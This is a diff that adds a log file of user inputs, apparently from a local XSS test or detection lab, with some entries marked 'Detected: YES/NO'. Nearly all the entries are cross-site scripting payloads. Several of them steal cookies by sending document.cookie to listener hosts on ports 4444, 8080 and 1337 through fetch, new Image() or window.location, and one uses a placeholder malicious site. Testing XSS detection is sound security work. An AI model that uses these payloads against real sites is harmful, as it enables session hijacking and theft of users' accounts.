@@ -1,0 +1,160 @@
+User Input: erer
+User Input: 
+User Input: asdas
+User Input: 
+User Input: 
+User Input: erer
+User Input: <img src="x" onerror="document.body.innerHTML='Hacked!'">
+User Input: <a href="#" onmouseover="alert('XSS Attack!')">Hover me</a>
+User Input: 
+User Input: <svg onload="alert('XSS Executed!')">
+User Input: <svg onload="alert('XSS Executed!')">
+User Input: 
+User Input: <img src="x" onerror="document.body.innerHTML='Hacked!'">
+User Input: 
+User Input: 
+User Input: asdas
+User Input: 
+User Input: 
+User Input: <img src=x onerror="window.location='hidden.phtml'">
+User Input: 
+User Input: <svg onload="alert('XSS Executed!')">
+User Input: <input type="text" value="XSS" onfocus="alert('Pwned!')">
+User Input: 
+User Input: <input type="text" value="XSS" onfocus="alert('Pwned!')">
+User Input: 
+User Input: <button onclick="document.body.style.background='red'">Click me</button>
+User Input: <img src=x onerror="document.location='https://your-malicious-site.com/steal.php?cookie='+document.cookie">
+User Input: 
+User Input: <script>alert(document.cookie)</script>
+User Input: <script>alert(document.cookie);</script>
+User Input: <img src="x" onerror="alert(document.cookie);">
+User Input: <img src="x" onerror="alert(document.cookie);">
+User Input: <a href="#" onmouseover="alert('XSS Attack!')">Hover me</a>
+User Input: 
+User Input: 
+User Input: <a href="#" onmouseover="alert('XSS Attack!')">Hover me</a>
+User Input: 
+User Input: 
+User Input: <script>   var cookie = document.cookie;   var img = new Image();   img.src = "http://127.0.0.1:4444/?cookie=" + encodeURIComponent(cookie); </script>
+User Input: <script>alert(document.cookie)</script>
+User Input: 
+User Input: 
+User Input: 
+User Input: <img src="x" onerror="new Image().src='http://127.0.0.1:4444/?cookie='+document.cookie;">
+User Input: <a href="#" onmouseover="new Image().src='http://127.0.0.1:4444/?cookie='+document.cookie;">Hover Me</a>
+User Input: 
+User Input: <script>alert('XSS Working!');</script>
+User Input: <script>   new Image().src = "http://127.0.0.1:4444/?cookie=" + document.cookie; </script>
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script>
+User Input: <script>   console.log("Stolen Cookies: " + document.cookie); </script>
+User Input: 
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script>
+User Input: 
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script>
+User Input: 
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script>
+User Input: <script>   alert(
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script>
+User Input: <script>   alert(
+User Input: 
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script>
+User Input: 
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script>
+User Input: 
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script>
+User Input: 
+User Input: <script>   new Image().src = "http://127.0.0.1:4444/?cookie=" + document.cookie; </script>
+User Input: 
+User Input: <script>windows.location='http://127.0.0.1:4444/?cookie=' + document.cookie</script>
+User Input: <script>windows.location='http://127.0.0.1:4444/?cookie=' + document.cookie</script>
+User Input: <img src="x" onerror="document.body.innerHTML='Hacked!'">
+User Input: 
+User Input: <script>   new Image().src = "http://192.168.100.6:4444/?cookie=" + document.cookie; </script>
+User Input: <script>   new Image().src = "http://120.0.0.1:4444/?cookie=" + document.cookie; </script>
+User Input: <script>   new Image().src = "http://0.0.0.0:4444/?cookie=" + document.cookie; </script>
+User Input: 
+User Input: <script>     // Send the document's cookies (including the XSS_Token) to the listener     fetch('http://localhost:8080/steal?cookie=' + document.cookie, {          method: 'GET',         headers: {             'Content-Type': 'application/json'         }     }); </script>
+User Input: <script>     // Send the document's cookies (including the XSS_Token) to the listener     fetch('http://localhost:8080/steal?cookie=' + document.cookie, {          method: 'GET',         headers: {             'Content-Type': 'application/json'         }     }); </script>
+User Input: 
+User Input: <script>     // Send the document's cookies (including the XSS_Token) to the listener     fetch('http://localhost:8080/steal?cookie=' + document.cookie, {          method: 'GET',         headers: {             'Content-Type': 'application/json'         }     }); </script>
+User Input: <script>     // Send the document's cookies (including the XSS_Token and other cookies) to the attacker's listener     fetch('http://localhost:8080/steal?cookie=' + encodeURIComponent(document.cookie), {          method: 'GET',         headers: {             'Content-Type': 'application/json'         }     }); </script>
+User Input: <script>     // Send the document's cookies (including the XSS_Token and other cookies) to the attacker's listener     fetch('http://0.0.0.0:8080/steal?cookie=' + encodeURIComponent(document.cookie), {          method: 'GET',         headers: {             'Content-Type': 'application/json'         }     }); </script>
+User Input: <script>     // Send the document's cookies (including the XSS_Token and other cookies) to the attacker's listener     fetch('http://0.0.0.0:8080/steal?cookie=' + encodeURIComponent(document.cookie), {          method: 'GET',         headers: {             'Content-Type': 'application/json'         }     }); </script>
+User Input: 
+User Input: <script>     fetch('http://0.0.0.0:8000/steal?cookie=' + document.cookie); </script>
+User Input:  | Detected: NO
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script> | Detected: NO
+User Input: <a href="#" onmouseover="alert('XSS Attack!')">Hover me</a> | Detected: NO
+User Input:  | Detected: NO
+User Input: <img src="x" onerror="document.body.innerHTML='Hacked!'"> | Detected: NO
+User Input:  | Detected: NO
+User Input:  | Detected: NO
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script> | Detected: NO
+User Input:  | Detected: NO
+User Input: <svg onload="alert('XSS Executed!')"> | Detected: NO
+User Input:  | Detected: NO
+User Input: <svg onload="alert('XSS Executed!')"> | Detected: YES
+User Input:  | Detected: NO
+User Input: <img src="x" onerror="document.body.innerHTML='Hacked!'"> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script> | Detected: YES
+User Input:  | Detected: NO
+User Input:  | Detected: NO
+User Input: asdasd | Detected: NO
+User Input:  | Detected: NO
+User Input: fdsafsdgfs | Detected: NO
+User Input: <svg onload="alert('XSS Executed!')"> | Detected: YES
+User Input:  | Detected: NO
+User Input:  | Detected: NO
+User Input:  | Detected: NO
+User Input: sadas | Detected: NO
+User Input: <script>   alert("Stolen Cookies: " + document.cookie); </script> | Detected: YES
+User Input: <script>window.location='http://10.57.72.79:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input: <script>window.location='http://0.0.0.0:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input: <script>window.location='http://127.0.0.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.99.216.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.99.216.66:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.99.216.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
+User Input:  | Detected: NO
+User Input: <script>window.location='http://10.57.64.1:1337/?cookie=' + document.cookie</script> | Detected: YES
